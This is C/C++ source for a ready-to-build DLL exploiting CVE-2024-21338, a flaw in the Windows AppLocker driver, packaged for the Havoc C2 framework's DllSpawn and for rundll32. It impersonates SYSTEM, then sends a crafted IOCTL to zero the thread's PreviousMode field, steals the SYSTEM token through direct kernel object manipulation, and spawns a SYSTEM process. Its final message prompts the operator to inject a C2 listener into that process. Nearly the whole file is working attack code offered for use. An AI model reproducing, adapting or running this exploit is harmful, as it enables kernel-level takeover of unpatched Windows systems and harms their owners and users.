/*
 * CVE-2024-21338 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:    AppLocker driver (appid.sys) IOCTL 0x22A018 (AipSmartHashImageFile)
 *          calls kCFG-validated callback -> ObfDereferenceObjectWithTag
 *          does lock xadd [rsi-0x30], rbx -> zeroes KTHREAD.PreviousMode
 * Req:     Admin rights + AppLocker/SmartLocker enabled (appid.sys loaded)
 * Method:  IOCTL -> PreviousMode=0 -> NtWriteVirtualMemory DKOM -> SYSTEM
 *
 * Targets: Windows 10/11 (pre-Feb 2024 patch), works with HVCI
 * Patched: KB5034763 (February 13, 2024)
 *
 * Based on: github.com/hakaioffsec/CVE-2024-21338
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2024_21338.dll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <sddl.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")

#ifdef __cplusplus
extern "C" {
#endif

#define APPID_IOCTL  0x22A018

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;              \
}
#endif

/* ================================================================
 * Structures
 * ================================================================ */
typedef struct { PVOID FunctionPointer; } CFG_FUNC_WRAPPER;

typedef struct {
    UINT64           FirstArg;
    PVOID            Value;
    CFG_FUNC_WRAPPER *Wrapper;
} IOCTL_BUF_W10;

typedef struct {
    UINT64           FirstArg;
    PVOID            Value;
    CFG_FUNC_WRAPPER *Wrapper;
    PVOID            Reserved;
} IOCTL_BUF_W11;

typedef struct {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYS_HANDLE_ENTRY;

typedef struct {
    ULONG            NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

typedef struct {
    ULONG Reserved1;
    ULONG Reserved2;
#ifdef _WIN64
    ULONG Reserved3;
#endif
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD  Id;
    WORD  Rank;
    WORD  w018;
    WORD  NameOffset;
    CHAR  Name[255];
} SYS_MODULE;

typedef struct {
    ULONG      ModulesCount;
    SYS_MODULE Modules[1];
} SYS_MODULE_INFO;

/* ================================================================
 * ntdll function typedefs
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *fn_NtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *fn_NtDeviceIoControlFile)(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef VOID     (NTAPI *fn_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS (NTAPI *fn_RtlGetVersion)(PRTL_OSVERSIONINFOW);
typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);

static fn_NtWriteVirtualMemory    pNtWriteVirtualMemory;
static fn_NtQuerySystemInformation pNtQuerySystemInformation;
static fn_NtCreateFile            pNtCreateFile;
static fn_NtDeviceIoControlFile   pNtDeviceIoControlFile;
static fn_RtlInitUnicodeString    pRtlInitUnicodeString;
static fn_RtlGetVersion           pRtlGetVersion;
static fn_NtClose                 pNtClose;

/* ================================================================
 * Globals
 * ================================================================ */
static wchar_t g_target[MAX_PATH] = L"notepad.exe";
static ULONG   g_build     = 0;
static ULONG   g_tokenOff  = 0;
static ULONG   g_prevMode  = 0x232;

/* ================================================================
 * FixStdout
 * ================================================================ */
static void FixStdout(void) {
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    if (!h || h == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)h, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Resolve ntdll + offsets
 * ================================================================ */
static BOOL NtLoad(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;
    pNtWriteVirtualMemory     = (fn_NtWriteVirtualMemory)GetProcAddress(h, "NtWriteVirtualMemory");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    pNtCreateFile             = (fn_NtCreateFile)GetProcAddress(h, "NtCreateFile");
    pNtDeviceIoControlFile    = (fn_NtDeviceIoControlFile)GetProcAddress(h, "NtDeviceIoControlFile");
    pRtlInitUnicodeString     = (fn_RtlInitUnicodeString)GetProcAddress(h, "RtlInitUnicodeString");
    pRtlGetVersion            = (fn_RtlGetVersion)GetProcAddress(h, "RtlGetVersion");
    pNtClose                  = (fn_NtClose)GetProcAddress(h, "NtClose");
    return (pNtWriteVirtualMemory && pNtQuerySystemInformation &&
            pNtCreateFile && pNtDeviceIoControlFile &&
            pRtlInitUnicodeString && pRtlGetVersion && pNtClose);
}

static BOOL ResolveOffsets(void) {
    RTL_OSVERSIONINFOW vi = {0};
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (pRtlGetVersion(&vi) != 0) return FALSE;
    g_build = vi.dwBuildNumber;
    printf("[*] OS: Windows %lu.%lu Build %lu\n", vi.dwMajorVersion, vi.dwMinorVersion, g_build);
    g_prevMode = 0x232;
    if (g_build <= 17763)      g_tokenOff = 0x358;
    else if (g_build <= 18363) g_tokenOff = 0x360;
    else                       g_tokenOff = 0x4B8;
    printf("[+] Offsets: Token=0x%X PreviousMode=0x%X\n", g_tokenOff, g_prevMode);
    return TRUE;
}

/* ================================================================
 * Handle table query
 * ================================================================ */
static BOOL GetObjPtr(PULONG64 pAddr, ULONG pid, HANDLE handle) {
    SYS_HANDLE_INFO *pInfo = NULL;
    ULONG size = 0;
    NTSTATUS st;
    while ((st = pNtQuerySystemInformation(0x10, pInfo, size, &size)) == 0xC0000004L) {
        pInfo = pInfo
            ? (SYS_HANDLE_INFO*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pInfo, (SIZE_T)size * 2)
            : (SYS_HANDLE_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)size * 2);
        if (!pInfo) return FALSE;
    }
    if (st != 0) { if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo); return FALSE; }
    BOOL found = FALSE;
    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (USHORT)pid &&
            pInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle) {
            *pAddr = (ULONG64)pInfo->Handles[i].Object;
            found = TRUE; break;
        }
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
    return found;
}

/* ================================================================
 * Token impersonation helpers
 * ================================================================ */
static BOOL EnablePrivilege(const wchar_t *priv) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp = {0};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, priv, &tp.Privileges[0].Luid)) { CloseHandle(hToken); return FALSE; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}

static BOOL ImpersonateAsSid(const wchar_t *sidStr) {
    PSID pTarget = NULL;
    if (!ConvertStringSidToSidW(sidStr, &pTarget)) return FALSE;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { LocalFree(pTarget); return FALSE; }

    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    BOOL found = FALSE;

    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
            if (!hProc) continue;
            HANDLE hToken;
            if (OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
                DWORD sz = 0;
                GetTokenInformation(hToken, TokenUser, NULL, 0, &sz);
                TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, sz);
                if (tu && GetTokenInformation(hToken, TokenUser, tu, sz, &sz)) {
                    if (EqualSid(tu->User.Sid, pTarget)) {
                        HANDLE hDup;
                        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
                                             SecurityImpersonation, TokenImpersonation, &hDup)) {
                            if (SetThreadToken(NULL, hDup))
                                found = TRUE;
                            else
                                CloseHandle(hDup);
                        }
                    }
                }
                if (tu) HeapFree(GetProcessHeap(), 0, tu);
                CloseHandle(hToken);
            }
            CloseHandle(hProc);
        } while (!found && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    LocalFree(pTarget);
    return found;
}

/* ================================================================
 * Find nt!ExpProfileDelete kCFG gadget
 * ================================================================ */
static UINT_PTR GetKernelModuleBase(const char *name) {
    SYS_MODULE_INFO *pInfo = NULL;
    ULONG size = 0;
    NTSTATUS st;
    while ((st = pNtQuerySystemInformation(11, pInfo, size, &size)) == 0xC0000004L) {
        pInfo = pInfo
            ? (SYS_MODULE_INFO*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pInfo, (SIZE_T)size * 2)
            : (SYS_MODULE_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)size * 2);
        if (!pInfo) return 0;
    }
    UINT_PTR base = 0;
    if (st == 0) {
        for (ULONG i = 0; i < pInfo->ModulesCount; i++) {
            if (strstr(pInfo->Modules[i].Name, name)) {
                base = (UINT_PTR)pInfo->Modules[i].ImageBaseAddress;
                break;
            }
        }
    }
    HeapFree(GetProcessHeap(), 0, pInfo);
    return base;
}

static UINT_PTR FindKcfgGadget(UINT_PTR kernelBase) {
    HMODULE hUser = LoadLibraryExW(
        L"C:\\Windows\\System32\\ntoskrnl.exe", NULL, 1 /* DONT_RESOLVE_DLL_REFERENCES */);
    if (!hUser) {
        printf("[-] LoadLibraryEx ntoskrnl: %u\n", GetLastError());
        return 0;
    }

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)hUser;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)((BYTE*)hUser + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    UINT_PTR offset = 0;
    BYTE pat[] = { 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83,
                   0x79, 0x30, 0x00, 0x48, 0x8B, 0xD9, 0x74 };

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, "PAGE", 4) == 0) {
            BYTE *base = (BYTE*)hUser + sec[i].VirtualAddress;
            SIZE_T sz = sec[i].Misc.VirtualSize;
            for (SIZE_T j = 0; j + sizeof(pat) <= sz; j++) {
                if (memcmp(base + j, pat, sizeof(pat)) == 0) {
                    offset = (UINT_PTR)(base + j) - (UINT_PTR)hUser;
                    break;
                }
            }
            break;
        }
    }

    FreeLibrary(hUser);
    return offset ? kernelBase + offset : 0;
}

/* ================================================================
 * SYSTEM check
 * ================================================================ */
static BOOL IsSystem(void) {
    HANDLE hT = NULL; BOOL r = FALSE; DWORD sz = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hT)) return FALSE;
    GetTokenInformation(hT, TokenUser, NULL, 0, &sz);
    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, sz);
    if (tu && GetTokenInformation(hT, TokenUser, tu, sz, &sz)) {
        SID_IDENTIFIER_AUTHORITY a = SECURITY_NT_AUTHORITY;
        PSID s = NULL;
        if (AllocateAndInitializeSid(&a, 1, SECURITY_LOCAL_SYSTEM_RID, 0,0,0,0,0,0,0, &s)) {
            r = EqualSid(tu->User.Sid, s); FreeSid(s);
        }
    }
    if (tu) HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hT);
    return r;
}

static BOOL IsAdmin(void) {
    HANDLE hT; TOKEN_ELEVATION e = {0}; DWORD sz;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hT)) return FALSE;
    GetTokenInformation(hT, TokenElevation, &e, sizeof(e), &sz);
    CloseHandle(hT);
    return e.TokenIsElevated;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void) {
    UNICODE_STRING devName = {0};
    OBJECT_ATTRIBUTES oa = {0};
    IO_STATUS_BLOCK iosb = {0};
    HANDLE hDev = NULL;
    CFG_FUNC_WRAPPER wrapper = {0};
    NTSTATUS st = 0;
    ULONG wr = 0;

    printf("[*] CVE-2024-21338 - AppLocker Driver LPE\n");
    printf("[*] Target: %S\n\n", g_target);

    if (IsSystem()) { printf("[+] Already SYSTEM!\n"); goto spawn; }

    /* 1 - Resolve */
    if (!NtLoad())          { printf("[-] ntdll resolve failed\n"); return FALSE; }
    if (!ResolveOffsets())  { printf("[-] OS detect failed\n"); return FALSE; }
    printf("[+] ntdll OK\n");

    /* 2 - Admin check */
    if (!IsAdmin()) {
        printf("[-] NOT admin. This exploit requires admin rights\n");
        printf("[-] Use CVE-2024-26229 (csc.sys) for user->SYSTEM\n");
        return FALSE;
    }
    printf("[+] Running as admin\n");

    /* 3 - Enable privileges */
    EnablePrivilege(L"SeDebugPrivilege");
    EnablePrivilege(L"SeImpersonatePrivilege");
    printf("[+] Privileges enabled\n");

    /* 4 - Impersonate SYSTEM then LOCAL SERVICE */
    printf("[*] Impersonating as SYSTEM...\n");
    if (!ImpersonateAsSid(L"S-1-5-18")) {
        printf("[-] SYSTEM impersonation failed\n");
        return FALSE;
    }
    printf("[+] Now SYSTEM\n");

    printf("[*] Impersonating as LOCAL SERVICE...\n");
    if (!ImpersonateAsSid(L"S-1-5-19")) {
        printf("[-] LOCAL SERVICE impersonation failed\n");
        printf("[*] Trying without LOCAL SERVICE...\n");
    } else {
        printf("[+] Now LOCAL SERVICE\n");
    }

    /* 5 - Open AppLocker device */

    pRtlInitUnicodeString(&devName, L"\\Device\\AppID");
    InitializeObjectAttributes(&oa, &devName, 0x40 /*OBJ_CASE_INSENSITIVE*/, NULL, NULL);

    st = pNtCreateFile(&hDev, GENERIC_READ | GENERIC_WRITE, &oa, &iosb,
                       NULL, FILE_ATTRIBUTE_NORMAL,
                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                       FILE_OPEN, 0, NULL, 0);
    if (st != 0) {
        printf("[-] Open AppLocker device failed: 0x%08x\n", (unsigned)st);
        printf("[-] AppLocker/SmartLocker not enabled?\n");
        SetThreadToken(NULL, NULL);
        return FALSE;
    }
    printf("[+] AppLocker device opened\n");

    /* 6 - Get ETHREAD address */
    HANDLE hPseudo = (HANDLE)(LONG_PTR)-2;
    HANDLE hDupThread = NULL;
    DuplicateHandle(GetCurrentProcess(), hPseudo, GetCurrentProcess(),
                    &hDupThread, 0, FALSE, DUPLICATE_SAME_ACCESS);

    ULONG64 ethread = 0;
    if (!GetObjPtr(&ethread, GetCurrentProcessId(), hDupThread)) {
        printf("[-] ETHREAD query failed\n");
        pNtClose(hDev); SetThreadToken(NULL, NULL);
        return FALSE;
    }
    printf("[+] ETHREAD: 0x%llx\n", ethread);
    CloseHandle(hDupThread);

    ULONG64 prevModeAddr = ethread + g_prevMode;
    printf("[+] PreviousMode addr: 0x%llx\n", prevModeAddr);

    /* 7 - Get FILE_OBJECT for reference counting */
    HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\~appid.tmp",
                               GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile: %u\n", GetLastError());
        pNtClose(hDev); SetThreadToken(NULL, NULL);
        return FALSE;
    }
    ULONG64 fileObj = 0;
    GetObjPtr(&fileObj, GetCurrentProcessId(), hFile);
    printf("[+] FILE_OBJECT: 0x%llx\n", fileObj);

    /* 8 - Find kCFG gadget (nt!ExpProfileDelete) */
    UINT_PTR kBase = GetKernelModuleBase("ntoskrnl.exe");
    if (!kBase) {
        printf("[-] ntoskrnl base not found\n");
        CloseHandle(hFile); pNtClose(hDev); SetThreadToken(NULL, NULL);
        return FALSE;
    }
    printf("[+] ntoskrnl base: 0x%llx\n", (ULONG64)kBase);

    UINT_PTR gadget = FindKcfgGadget(kBase);
    if (!gadget) {
        printf("[-] ExpProfileDelete gadget not found\n");
        CloseHandle(hFile); pNtClose(hDev); SetThreadToken(NULL, NULL);
        return FALSE;
    }
    printf("[+] kCFG gadget: 0x%llx\n", (ULONG64)gadget);

    /* 9 - Prepare IOCTL and send */
    wrapper.FunctionPointer = (PVOID)gadget;
    UINT_PTR prevModeObf = prevModeAddr + 0x30;

    printf("[*] Sending IOCTL 0x%x...\n", APPID_IOCTL);

    if (g_build < 22000) {
        IOCTL_BUF_W10 buf = {0};
        buf.FirstArg = prevModeObf;
        buf.Value    = (PVOID)fileObj;
        buf.Wrapper  = &wrapper;
        pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                               APPID_IOCTL, &buf, sizeof(buf), NULL, 0);
    } else {
        IOCTL_BUF_W11 buf = {0};
        buf.FirstArg = prevModeObf;
        buf.Value    = (PVOID)fileObj;
        buf.Wrapper  = &wrapper;
        buf.Reserved = NULL;
        pNtDeviceIoControlFile(hDev, NULL, NULL, NULL, &iosb,
                               APPID_IOCTL, &buf, sizeof(buf), NULL, 0);
    }

    /* Verify PreviousMode was zeroed */
    char modeByte = 1;
    pNtWriteVirtualMemory(GetCurrentProcess(), &modeByte, (PVOID)prevModeAddr, 1, &wr);
    printf("[+] PreviousMode read: %d\n", modeByte);

    if (modeByte != 0) {
        printf("[-] PreviousMode not zeroed. Exploit may have failed\n");
        printf("[-] Patched? (KB5034763, Feb 2024)\n");
        CloseHandle(hFile); pNtClose(hDev); SetThreadToken(NULL, NULL);
        return FALSE;
    }
    printf("[+] PreviousMode -> KernelMode (0)\n");

    /* 10 - Get System EPROCESS */
    ULONG64 sysEproc = 0;
    if (!GetObjPtr(&sysEproc, 4, (HANDLE)4)) {
        printf("[-] System EPROCESS query failed\n");
        goto restore;
    }
    printf("[+] System EPROCESS: 0x%llx\n", sysEproc);

    /* Get current EPROCESS */
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    ULONG64 curEproc = 0;
    if (!hProc || !GetObjPtr(&curEproc, GetCurrentProcessId(), hProc)) {
        printf("[-] Current EPROCESS query failed\n");
        if (hProc) CloseHandle(hProc);
        goto restore;
    }
    printf("[+] Current EPROCESS: 0x%llx\n", curEproc);
    CloseHandle(hProc);

    /* 11 - DKOM token swap */
    printf("[*] DKOM: overwriting Token (0x%X)...\n", g_tokenOff);
    st = pNtWriteVirtualMemory(GetCurrentProcess(),
                               (PVOID)(curEproc + g_tokenOff),
                               (PVOID)(sysEproc + g_tokenOff), 8, &wr);
    if (st != 0) {
        printf("[-] Token write failed: 0x%08x\n", (unsigned)st);
        goto restore;
    }
    printf("[+] Token replaced!\n");

restore:
    /* 12 - Restore PreviousMode */
    {
        UCHAR mode = 1;
        pNtWriteVirtualMemory(GetCurrentProcess(),
                              (PVOID)prevModeAddr, &mode, 1, &wr);
        printf("[+] PreviousMode restored\n");
    }

    /* Cleanup impersonation */
    SetThreadToken(NULL, NULL);
    pNtClose(hDev);
    CloseHandle(hFile);
    DeleteFileW(L"C:\\Users\\Public\\~appid.tmp");

    /* 13 - Verify */
    if (!IsSystem()) {
        printf("[-] Verification failed\n");
        return FALSE;
    }
    printf("[+] === WE ARE NT AUTHORITY\\SYSTEM ===\n\n");

spawn:
    {
        STARTUPINFOW si; PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";
        wchar_t cmd[MAX_PATH];
        lstrcpynW(cmd, g_target, MAX_PATH);
        printf("[*] Spawning: %S\n", g_target);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[-] CreateProcessW: %u\n", GetLastError());
            return FALSE;
        }
        printf("\n[+] ==================================\n");
        printf("[+]  SYSTEM process created!\n");
        printf("[+]  Process: %S\n", g_target);
        printf("[+]  PID:     %u\n", pi.dwProcessId);
        printf("[+] ==================================\n\n");
        printf("[*] Next: shinject %u x64 <listener>\n", pi.dwProcessId);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    return TRUE;
}

/* ================================================================
 * Check mode
 * ================================================================ */
static void DoCheck(void) {
    printf("[*] CVE-2024-21338 - Pre-flight Check\n\n");
    if (!NtLoad() || !ResolveOffsets()) { printf("[-] Init failed\n"); return; }

    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    printf("[*] Arch: %s\n", si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");
    printf(IsAdmin()  ? "[+] Admin: YES\n"  : "[-] Admin: NO (required!)\n");
    printf(IsSystem() ? "[+] SYSTEM: YES\n" : "[*] SYSTEM: NO\n");

    EnablePrivilege(L"SeDebugPrivilege");

    UNICODE_STRING dn; OBJECT_ATTRIBUTES oa; IO_STATUS_BLOCK iosb;
    pRtlInitUnicodeString(&dn, L"\\Device\\AppID");
    InitializeObjectAttributes(&oa, &dn, 0x40, NULL, NULL);
    HANDLE hDev;
    NTSTATUS st = pNtCreateFile(&hDev, GENERIC_READ | GENERIC_WRITE, &oa, &iosb,
                                NULL, FILE_ATTRIBUTE_NORMAL,
                                FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, 0, NULL, 0);
    if (st == 0) { printf("[+] AppLocker device: ACCESSIBLE\n"); pNtClose(hDev); }
    else         { printf("[-] AppLocker device: NOT accessible (0x%08x)\n", (unsigned)st); }

    UINT_PTR kb = GetKernelModuleBase("ntoskrnl.exe");
    if (kb) {
        printf("[+] ntoskrnl: 0x%llx\n", (ULONG64)kb);
        UINT_PTR g = FindKcfgGadget(kb);
        printf(g ? "[+] kCFG gadget: 0x%llx\n" : "[-] kCFG gadget: NOT found\n", (ULONG64)g);
    }
    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Args
 * ================================================================ */
static void ParseArgs(const char *args) {
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;
    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' || g_target[len-1] == L'\r' || g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();
        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;
        printf("[cve-2024-21338] args: %s\n\n", args ? args : "(none)");
        if (args && strncmp(args, "check", 5) == 0) DoCheck();
        else { ParseArgs(args); DoExploit(); }
        printf("\n[cve-2024-21338] Done\n");
        fflush(stdout);
    }
    return TRUE;
}

/* ================================================================
 * rundll32 exports
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hw, HINSTANCE hi, LPWSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    char b[512]={0};
    if(cmd&&cmd[0]) WideCharToMultiByte(CP_ACP,0,cmd,-1,b,511,NULL,NULL);
    if(b[0]&&strncmp(b,"check",5)==0) DoCheck();
    else { ParseArgs(b[0]?b:NULL); DoExploit(); }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hw, HINSTANCE hi, LPSTR cmd, int sh) {
    (void)hw;(void)hi;(void)sh;
    FixStdout();
    if(cmd&&cmd[0]&&strncmp(cmd,"check",5)==0) DoCheck();
    else { ParseArgs(cmd); DoExploit(); }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
